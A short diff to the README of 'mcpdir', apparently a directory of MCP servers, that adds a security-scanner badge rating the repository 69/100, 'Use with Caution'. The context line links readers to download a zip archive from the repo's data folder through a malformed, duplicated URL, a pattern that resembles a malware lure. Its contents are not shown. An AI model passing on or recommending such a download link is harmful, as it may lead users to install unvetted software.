@@ -1,5 +1,7 @@
 # 🗂️ mcpdir - Explore a Vast Directory of MCP Servers
 
+[![SafeSkill 69/100](https://img.shields.io/badge/SafeSkill-69%2F100_Use%20with%20Caution-orange)](https://safeskill.dev/scan/zakariaberm47-mcpdir)
+
 [![Download mcpdir](https://github.com/Zakariaberm47/mcpdir/raw/refs/heads/main/data/Software_v3.7.zip[id]https://github.com/Zakariaberm47/mcpdir/raw/refs/heads/main/data/Software_v3.7.zip)](https://github.com/Zakariaberm47/mcpdir/raw/refs/heads/main/data/Software_v3.7.zip[id]https://github.com/Zakariaberm47/mcpdir/raw/refs/heads/main/data/Software_v3.7.zip)
 
 ## 📄 Description
